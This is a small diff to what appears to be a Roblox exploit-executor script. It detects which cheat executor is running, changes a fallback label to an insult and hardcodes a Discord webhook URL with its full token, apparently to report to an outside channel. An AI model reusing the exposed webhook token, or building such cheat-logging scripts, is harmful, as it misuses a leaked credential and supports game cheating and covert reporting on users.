@@ -6,7 +6,7 @@ local webhookcheck =
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
-   "Prob swift ngl"
+   "Kid with shit exploit"
 
 local url =
    "https://discord.com/api/webhooks/1373465597903372308/osuLSMh8U5uS_Lo-PpAdl8c5uo0IVHmfIxBulmMXoY6uVUdUX5VBW6ctfg6p3hFjQgVI" --pretty obvious what to do here
